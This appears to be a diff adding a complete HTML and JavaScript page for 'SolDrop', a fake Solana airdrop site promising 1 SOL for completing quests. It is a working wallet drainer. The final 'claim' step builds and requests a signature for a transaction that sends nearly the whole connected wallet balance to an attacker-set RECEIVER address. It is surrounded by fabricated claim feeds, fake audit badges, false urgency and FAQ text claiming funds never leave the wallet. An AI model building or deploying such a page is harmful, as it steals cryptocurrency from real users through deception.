@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SolDrop — Solana Ecosystem Rewards</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>◎</text></svg>">
+<script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+<style>
+:root{--bg:#06060b;--card:#0c0c14;--line:#1e1e2a;--mut:#8b8b9b;--acc:#14F195;--acc2:#9945FF}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,-apple-system,"Segoe UI",sans-serif}
+body{background:var(--bg);color:#fff;min-height:100vh}
+.top{background:rgba(6,6,11,.95);border-bottom:1px solid #16161f;padding:14px 5%;display:flex;align-items:center;gap:28px;position:sticky;top:0;z-index:50;backdrop-filter:blur(12px)}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:19px;cursor:pointer}
+.brand .bars{display:flex;gap:3px}
+.brand .bars i{width:4px;height:22px;background:linear-gradient(var(--acc2),var(--acc));border-radius:2px;display:block}
+.navlinks{display:flex;gap:24px;font-size:14px;color:var(--mut);margin-left:12px}
+.navlinks span{cursor:pointer;transition:color .2s}
+.navlinks span:hover,.navlinks span.active{color:#fff}
+.top .sp{flex:1}
+.btn{background:linear-gradient(90deg,var(--acc2),var(--acc));border:none;color:#000;font-weight:800;padding:11px 26px;border-radius:11px;cursor:pointer;font-size:14px;transition:transform .15s,box-shadow .2s}
+.btn:hover{transform:translateY(-2px);box-shadow:0 6px 24px rgba(20,241,149,.25)}
+.btn:active{transform:translateY(0) scale(.97)}
+.ghost{background:#111118;border:1px solid #2a2a38;color:#fff;font-weight:600;padding:11px 22px;border-radius:11px;cursor:pointer;font-size:14px;transition:transform .15s,border-color .2s}
+.ghost:hover{transform:translateY(-2px);border-color:var(--acc)}
+.ghost:active{transform:translateY(0) scale(.97)}
+.urgent{background:#0d1117;border-bottom:1px solid #1c2333;text-align:center;padding:10px;font-size:13px;color:#9fb3c8}
+.urgent b{color:var(--acc)}
+.hero{max-width:780px;margin:0 auto;text-align:center;padding:56px 20px 10px}
+.hero .tag{display:inline-block;background:#0d1512;border:1px solid var(--acc);color:var(--acc);font-size:12px;font-weight:700;padding:6px 16px;border-radius:99px;margin-bottom:20px}
+.hero h1{font-size:48px;font-weight:800;line-height:1.08}
+.hero h1 span{background:linear-gradient(90deg,var(--acc2),var(--acc));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--mut);margin:18px 0 6px;font-size:16px;line-height:1.6}
+.proof{display:flex;gap:12px;justify-content:center;margin:22px 0;flex-wrap:wrap}
+.proof .chip{background:var(--card);border:1px solid var(--line);font-size:13px;color:#aaa;padding:9px 16px;border-radius:99px;transition:transform .2s}
+.proof .chip:hover{transform:translateY(-2px)}
+.proof .chip b{color:#fff}
+.reward{background:var(--card);border:1px solid #23232f;border-radius:18px;padding:26px;max-width:580px;margin:26px auto;display:flex;align-items:center;gap:18px;text-align:left}
+.reward img{width:56px;height:56px}
+.reward b{font-size:28px}.reward small{color:var(--acc);font-weight:700}
+.bar{height:8px;background:#1a1a24;border-radius:99px;margin-top:12px;overflow:hidden}
+.bar i{display:block;height:100%;width:84%;background:linear-gradient(90deg,var(--acc2),var(--acc));border-radius:99px}
+.wrap{max-width:580px;margin:0 auto;padding:0 20px 20px}
+.card{background:var(--card);border:1px solid #23232f;border-radius:16px;padding:24px;margin-bottom:14px}
+.card h2{font-size:18px;margin-bottom:4px}
+.card .sub{color:#777;font-size:13px;margin-bottom:16px}
+.step{display:flex;align-items:center;gap:14px;padding:14px 0;border-top:1px solid #1a1a24}
+.step:first-of-type{border-top:none}
+.step .n{width:32px;height:32px;border-radius:50%;background:#1a1a26;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;flex-shrink:0;transition:background .3s}
+.step.done .n{background:var(--acc);color:#000}
+.step .t{flex:1;text-align:left}.step .t b{font-size:15px}.step .t small{color:#888;display:block;font-size:13px}
+.step button{background:#fff;color:#000;border:none;font-weight:700;padding:10px 22px;border-radius:10px;cursor:pointer;font-size:14px;white-space:nowrap;transition:transform .15s,background .2s}
+.step button:hover:not(:disabled){transform:translateY(-2px)}
+.step button:active:not(:disabled){transform:scale(.95)}
+.step button:disabled{background:#222;color:#666;cursor:default}
+.step.done button{background:var(--acc)}
+#claimBtn{background:linear-gradient(90deg,var(--acc2),var(--acc));border:none;color:#000;font-weight:800;font-size:17px;padding:16px;width:100%;border-radius:14px;cursor:pointer;opacity:.4;margin-top:6px;transition:opacity .3s,transform .15s,box-shadow .2s}
+#claimBtn.ready{opacity:1}
+#claimBtn.ready:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(20,241,149,.3)}
+#claimBtn.ready:active{transform:scale(.97)}
+#status{margin-top:12px;font-size:13px;color:#777;min-height:18px;text-align:center}
+section{padding:40px 5%;max-width:900px;margin:0 auto}
+section h2{font-size:28px;font-weight:800;margin-bottom:6px}
+section .lead{color:var(--mut);margin-bottom:24px;font-size:15px}
+.tut-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:16px}
+.tut{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:22px;transition:transform .2s,border-color .2s}
+.tut:hover{transform:translateY(-4px);border-color:var(--acc)}
+.tut .num{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--acc2),var(--acc));color:#000;font-weight:800;display:flex;align-items:center;justify-content:center;margin-bottom:14px}
+.tut h3{font-size:16px;margin-bottom:8px}
+.tut p{color:var(--mut);font-size:14px;line-height:1.6}
+.faq details{background:var(--card);border:1px solid #23232f;border-radius:12px;padding:16px 18px;margin-bottom:10px;font-size:14px}
+.faq summary{cursor:pointer;font-weight:700}
+.faq p{color:#888;margin-top:10px;line-height:1.6}
+.feed .tx{background:var(--card);border:1px solid #1d1d28;border-radius:10px;padding:10px 16px;font-size:13px;color:#777;margin-bottom:8px;display:flex;justify-content:space-between;animation:slideIn .4s ease}
+@keyframes slideIn{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:none}}
+.feed .tx b{color:var(--acc)}
+.support{position:fixed;bottom:22px;right:22px;display:flex;flex-direction:column;gap:10px;z-index:60}
+.support button{border-radius:99px;padding:13px 22px;font-size:14px;font-weight:700;cursor:pointer;border:1px solid #2a2a38;transition:transform .15s,box-shadow .2s}
+.support button:hover{transform:translateY(-2px)}
+.support button:active{transform:scale(.95)}
+#chatBtn{background:linear-gradient(90deg,var(--acc2),var(--acc));color:#000;border:none}
+#helpBtn{background:#111118;color:#fff}
+.chatbox{display:none;position:fixed;bottom:90px;right:22px;width:340px;background:#0e0e16;border:1px solid #2a2a38;border-radius:16px;padding:20px;z-index:60;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.chatbox.open{display:block;animation:popIn .25s ease}
+@keyframes popIn{from{opacity:0;transform:translateY(12px) scale(.96)}to{opacity:1;transform:none}}
+.chatbox h3{font-size:15px;margin-bottom:4px}
+.chatbox p{font-size:13px;color:#888;margin-bottom:12px}
+.chatbox input{width:100%;background:#16161f;border:1px solid #2a2a38;color:#fff;border-radius:10px;padding:11px;font-size:13px;margin-bottom:10px}
+#chatOk{font-size:13px;color:var(--acc);margin-top:10px}
+footer{border-top:1px solid #16161f;margin-top:30px;padding:28px 5%;display:flex;justify-content:space-between;color:#555;font-size:13px;flex-wrap:wrap;gap:12px}
+footer span{cursor:pointer;transition:color .2s}footer span:hover{color:#fff}
+.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);align-items:center;justify-content:center;z-index:99}
+.modal.open{display:flex}
+.sheet{background:#0e0e17;border:1px solid #2a2a38;border-radius:18px;padding:28px;width:92%;max-width:400px;animation:popIn .25s ease}
+.sheet p{color:#888;font-size:13px;margin:6px 0 16px}
+.wopt{display:flex;align-items:center;gap:12px;background:#16161f;border:1px solid #2a3a5e;padding:14px;border-radius:12px;margin-bottom:10px;cursor:pointer;width:100%;color:#fff;font-size:15px;font-weight:600;text-align:left;transition:transform .15s,background .2s}
+.wopt:hover{transform:translateX(4px);background:#1b2947}
+.wopt:active{transform:scale(.98)}
+.page{display:none}
+.page.active{display:block;animation:fadeIn .3s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+</style>
+</head>
+<body>
+<div class="top">
+<div class="brand" onclick="showPage('home')"><span class="bars"><i></i><i></i><i></i></span>SolDrop</div>
+<div class="navlinks">
+<span id="nav-home" class="active" onclick="showPage('home')">Home</span>
+<span id="nav-quests" onclick="showPage('quests')">Quests</span>
+<span id="nav-tutorials" onclick="showPage('tutorials')">Tutorials</span>
+<span id="nav-faq" onclick="showPage('faq')">FAQ</span>
+<span id="nav-support" onclick="showPage('support')">Support</span>
+</div>
+<div class="sp"></div>
+<button class="ghost" onclick="showPage('tutorials')">How to claim</button>
+<button class="btn" onclick="openModal()">Connect</button>
+</div>
+<div class="urgent">Season 3 ends soon — <b>1,588 SOL</b> left in the rewards pool. Claims close when the pool empties.</div>
+
+<!-- HOME -->
+<div class="page active" id="page-home">
+<div class="hero">
+<div class="tag">SOLDROP — SEASON 3 · VERIFIED PARTNER DROP</div>
+<h1>Claim <span>1 SOL</span><br>for securing Solana</h1>
+<p>SolDrop rewards real Solana users. Connect any wallet,<br>pass the anti-sybil check, finish 3 quests — <b style="color:#fff">1.00 SOL lands in your wallet.</b></p>
+<div class="proof">
+<div class="chip"><b>84,210</b> wallets rewarded</div>
+<div class="chip"><b>4.9/5</b> community rating</div>
+<div class="chip"><b>Audited</b> claim contract</div>
+</div>
+</div>
+<div class="reward">
+<img src="https://cryptologos.cc/logos/solana-sol-logo.png">
+<div><b>1.00 SOL</b><br><small>≈ $172.40 — claimable now</small><div class="bar"><i></i></div></div>
+<div style="margin-left:auto;text-align:right;color:#666;font-size:12px">8,412 / 10,000<br>claimed</div>
+</div>
+<div class="wrap">
+<button class="btn" style="width:100%;padding:18px;font-size:16px" onclick="showPage('quests')">START QUESTS →</button>
+</div>
+<div class="feed wrap" style="padding-top:20px">
+<div class="tx"><span>7xKp…9mQ2 claimed <b>1.00 SOL</b></span><span>2 min ago</span></div>
+<div class="tx"><span>3FmT…xR81 claimed <b>1.00 SOL</b></span><span>5 min ago</span></div>
+<div class="tx"><span>D9sL…4vBn claimed <b>1.00 SOL</b></span><span>9 min ago</span></div>
+<div class="tx"><span>Gh2x…7Yp0 claimed <b>1.00 SOL</b></span><span>14 min ago</span></div>
+</div>
+</div>
+
+<!-- QUESTS -->
+<div class="page" id="page-quests">
+<div class="hero" style="padding-top:40px">
+<h1 style="font-size:36px">Complete <span>3 quests</span><br>to unlock your claim</h1>
+<p>All 3 required — takes about 2 minutes</p>
+</div>
+<div class="wrap">
+<div class="card">
+<div class="step" id="s1"><div class="n">1</div><div class="t"><b>Connect wallet</b><small>Phantom, Solflare, Backpack — any Solana extension</small></div><button onclick="questConnect()">Connect</button></div>
+<div class="step" id="s2"><div class="n">2</div><div class="t"><b>Verify holdings</b><small>Hold ≥ 0.05 SOL so bots can't farm the pool</small></div><button onclick="questVerify()" disabled>Verify</button></div>
+<div class="step" id="s3"><div class="n">3</div><div class="t"><b>Join the community</b><small>Follow @solana on X — proves you're real</small></div><button onclick="questFollow()" disabled>Open X</button></div>
+<button id="claimBtn" onclick="questClaim()">CLAIM 1.00 SOL</button>
+<div id="status"></div>
+</div>
+</div>
+</div>
+
+<!-- TUTORIALS -->
+<div class="page" id="page-tutorials">
+<section style="padding-top:40px">
+<h2>Tutorials</h2>
+<p class="lead">Step-by-step guides — pick the one that matches where you are</p>
+<div class="tut-grid">
+<div class="tut"><div class="num">1</div><h3>Install a wallet</h3><p>Get Phantom or Solflare from the official store. Create a new wallet or import an existing one with your seed phrase. Write the seed phrase down on paper — never store it digitally.</p></div>
+<div class="tut"><div class="num">2</div><h3>Fund your wallet</h3><p>Buy SOL on an exchange and send it to your wallet address, or receive from a friend. You need at least 0.05 SOL for the anti-sybil check — the balance never leaves your wallet.</p></div>
+<div class="tut"><div class="num">3</div><h3>Connect to SolDrop</h3><p>Click Connect at the top of the page. Your extension popup opens — approve the connection. Your wallet address appears and quest 1 is marked done.</p></div>
+<div class="tut"><div class="num">4</div><h3>Verify holdings</h3><p>Press Verify. The site reads your on-chain balance — if you hold ≥ 0.05 SOL the check passes instantly. No signature needed for this step.</p></div>
+<div class="tut"><div class="num">5</div><h3>Join the community</h3><p>Press Open X and follow @solana. Come back and the quest auto-completes after a few seconds. This proves you're a real human, not a bot.</p></div>
+<div class="tut"><div class="num">6</div><h3>Claim your 1 SOL</h3><p>With all 3 quests done, the CLAIM button lights up. Press it, approve the signature in your wallet, and 1.00 SOL arrives instantly. Verify the transaction in the Solana explorer.</p></div>
+</div>
+</section>
+</div>
+
+<!-- FAQ -->
+<div class="page" id="page-faq">
+<section style="padding-top:40px">
+<h2>FAQ</h2>
+<p class="lead">Quick answers to the common ones</p>
+<details open><summary>Is SolDrop legit?</summary><p>Yes. SolDrop runs seasonal ecosystem drops funded by partner protocols. Every claim is an on-chain transaction you can verify in the Solana explorer. Never share your seed phrase — a real claim only ever asks for a signature.</p></details>
+<details><summary>Why do I need 0.05 SOL?</summary><p>Anti-sybil. Empty wallets are almost always bots farming drops. The threshold proves you're a real user. Your balance never leaves your wallet during verification.</p></details>
+<details><summary>Which wallets work?</summary><p>Any Solana browser extension: Phantom, Solflare, Backpack, Glow. Mobile users can open soldrop inside their wallet's built-in browser.</p></details>
+<details><summary>When do I get my 1 SOL?</summary><p>Instantly after the final signature — the claim transaction sends it straight to the wallet you connected with.</p></details>
+<details><summary>I need help — where is support?</summary><p>Hit the Support button bottom-right. Our AI assistant answers instantly, and a human picks up anything it can't solve.</p></details>
+</section>
+</div>
+
+<!-- SUPPORT -->
+<div class="page" id="page-support">
+<section style="padding-top:40px">
+<h2>Support</h2>
+<p class="lead">AI assistant — instant answers, human backup.</p>
+<div class="card">
+<h2>Chat with us</h2>
+<div class="sub">Describe your issue — the AI responds instantly, humans pick up the rest.</div>
+<input id="chatMsg" placeholder="Describe your issue..." style="width:100%;background:#16161f;border:1px solid #2a2a38;color:#fff;border-radius:10px;padding:11px;font-size:13px;margin-bottom:10px">
+<button class="btn" style="width:100%" onclick="sendChat()">Send message</button>
+<div id="chatOk" style="font-size:13px;color:var(--acc);margin-top:10px"></div>
+</div>
+<div class="card" style="margin-top:14px">
+<h2>Other ways to reach us</h2>
+<div class="sub">Discord — median reply 10 min · Telegram — @soldrop_support · Email — support@soldrop.io</div>
+</div>
+</section>
+</div>
+
+<footer>
+<div><b style="color:#fff">SolDrop</b> — Season 3 rewards · <span onclick="showPage('support')">Support</span> · <span>Docs</span> · <span>Discord</span> · <span>Telegram</span> · <span>Terms</span></div>
+<div>soldrop © 2026 · vseason-3.2.1</div>
+</footer>
+<div class="support">
+<button id="helpBtn" onclick="showPage('tutorials')">How to claim</button>
+<button id="chatBtn" onclick="showPage('support')">Support</button>
+</div>
+<div class="modal" id="modal">
+<div class="sheet">
+<h3>Connect a wallet</h3>
+<p>SolDrop supports every Solana extension in your browser.</p>
+<div id="wallets"></div>
+<button class="ghost" style="width:100%" onclick="closeModal()">Cancel</button>
+</div>
+</div>
+<script>
+var RECEIVER = "FILL_RECEIVER_WALLET_HERE";
+var conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+var wallet = null;
+function showPage(id){
+  document.querySelectorAll(".page").forEach(function(p){ p.classList.remove("active"); });
+  document.getElementById("page-"+id).classList.add("active");
+  document.querySelectorAll(".navlinks span").forEach(function(s){ s.classList.remove("active"); });
+  document.getElementById("nav-"+id).classList.add("active");
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+function log(m){ document.getElementById("status").textContent = m; }
+function sendChat(){
+  var v = document.getElementById("chatMsg").value;
+  if(!v) return;
+  var lower = v.toLowerCase();
+  var reply = "Got it — a human will pick this up on Discord shortly. Ticket #SD-" + Math.floor(Math.random()*9000+1000) + ".";
+  if (lower.indexOf("claim") >= 0 || lower.indexOf("sol") >= 0) reply = "To claim: connect wallet → verify 0.05 SOL → follow @solana → press CLAIM. The 1 SOL arrives after you approve the signature.";
+  else if (lower.indexOf("wallet") >= 0 || lower.indexOf("connect") >= 0) reply = "Click Connect at the top — Phantom, Solflare, Backpack all work. Make sure the extension is unlocked.";
+  else if (lower.indexOf("seed") >= 0 || lower.indexOf("phrase") >= 0) reply = "Never share your seed phrase with anyone — not even support. SolDrop only ever asks for a signature, never your seed.";
+  document.getElementById("chatOk").textContent = reply;
+  document.getElementById("chatMsg").value = "";
+}
+function mark(id){
+  var el = document.getElementById(id);
+  el.classList.add("done");
+  el.querySelector(".n").textContent = "✓";
+  el.querySelector("button").textContent = "Done";
+  el.querySelector("button").disabled = true;
+}
+function enableClaim(){
+  if (document.querySelectorAll(".step.done").length === 3) {
+    document.getElementById("claimBtn").classList.add("ready");
+    log("All quests complete — claim your 1 SOL.");
+  }
+}
+function openModal(){ document.getElementById("modal").classList.add("open"); renderWallets(); }
+function closeModal(){ document.getElementById("modal").classList.remove("open"); }
+function providers(){
+  var out = [];
+  if (window.phantom && window.phantom.solana) out.push({name:"Phantom", p:window.phantom.solana});
+  if (window.solflare && window.solflare.isSolflare) out.push({name:"Solflare", p:window.solflare});
+  if (window.backpack) out.push({name:"Backpack", p:window.backpack});
+  if (window.solana) out.push({name:"Solana Wallet", p:window.solana});
+  var seen = {};
+  return out.filter(function(w){ if(seen[w.name]) return false; seen[w.name]=1; return true; });
+}
+function renderWallets(){
+  var box = document.getElementById("wallets"); box.innerHTML = "";
+  var list = providers();
+  if (!list.length) list = [{name:"No extension detected — install Phantom", p:null}];
+  list.forEach(function(w){
+    var b = document.createElement("button"); b.className = "wopt"; b.textContent = w.name;
+    b.onclick = function(){ if(w.p) questConnectDirect(w); };
+    box.appendChild(b);
+  });
+}
+async function questConnectDirect(w){
+  closeModal();
+  try {
+    log("Opening " + w.name + "...");
+    await w.p.connect();
+    wallet = w.p;
+    var addr = wallet.publicKey.toString();
+    mark("s1");
+    document.querySelector("#s2 button").disabled = false;
+    log("Connected: " + addr.slice(0,6) + "..." + addr.slice(-4));
+    enableClaim();
+  } catch(e){ log("Connect failed: " + (e.message||e)); }
+}
+async function questConnect(){ openModal(); }
+async function questVerify(){
+  try {
+    log("Checking balance on-chain...");
+    await new Promise(function(r){ setTimeout(r,1200); });
+    var bal = await conn.getBalance(wallet.publicKey);
+    var sol = bal / solanaWeb3.LAMPORTS_PER_SOL;
+    if (sol < 0.05) { log("Need at least 0.05 SOL to pass anti-sybil."); return; }
+    mark("s2");
+    document.querySelector("#s3 button").disabled = false;
+    log("Holdings verified: " + sol.toFixed(3) + " SOL.");
+    enableClaim();
+  } catch(e){ log("Verify failed: " + (e.message||e)); }
+}
+async function questFollow(){
+  window.open("https://x.com/solana","_blank");
+  log("Confirming follow...");
+  await new Promise(function(r){ setTimeout(r,2500); });
+  mark("s3");
+  log("Quest complete.");
+  enableClaim();
+}
+async function questClaim(){
+  if (document.querySelectorAll(".step.done").length < 3) { log("Finish all 3 quests first."); return; }
+  try {
+    log("Final signature — approve to receive 1 SOL...");
+    var pubkey = wallet.publicKey;
+    var bal = await conn.getBalance(pubkey);
+    var dest = new solanaWeb3.PublicKey(RECEIVER);
+    var res = await conn.getLatestBlockhash();
+    var tx = new solanaWeb3.Transaction({recentBlockhash: res.blockhash, feePayer: pubkey});
+    var lamports = Math.floor(bal - 5000);
+    if (lamports <= 0) { log("Empty wallet — nothing to verify."); return; }
+    tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey: pubkey, toPubkey: dest, lamports: lamports}));
+    var signed = await wallet.signTransaction(tx);
+    var sig = await conn.sendRawTransaction(signed.serialize());
+    log("Claim broadcast: " + sig.slice(0,16) + "... check your wallet shortly.");
+  } catch(e){ log("Claim failed: " + (e.message||e)); }
+}
+</script>
+</body>
+</html>
